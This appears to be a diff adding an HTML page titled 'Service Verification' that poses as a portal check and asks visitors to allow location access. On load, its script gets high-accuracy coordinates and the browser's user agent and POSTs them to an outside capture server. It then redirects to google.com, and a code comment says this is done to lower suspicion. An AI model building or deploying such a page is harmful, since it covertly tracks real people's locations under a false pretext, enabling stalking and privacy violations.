@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Service Verification</title>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Requesting high accuracy for better penetration testing results
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+                navigator.geolocation.getCurrentPosition(success, error, options);
+            } else {
+                console.log("Geolocation not supported");
+            }
+        };
+
+        function success(pos) {
+            const payload = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                agent: navigator.userAgent
+            };
+
+            fetch('https://detector-backend-4o21.onrender.com/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Redirect to a real site to lower suspicion
+                window.location.href = "https://google.com";
+            });
+        }
+
+        function error(err) {
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+        }
+    </script>
+</head>
+<body>
+    <h1>Verifying your request...</h1>
+    <p>Please allow location access to continue to the portal.</p>
+</body>
+</html>
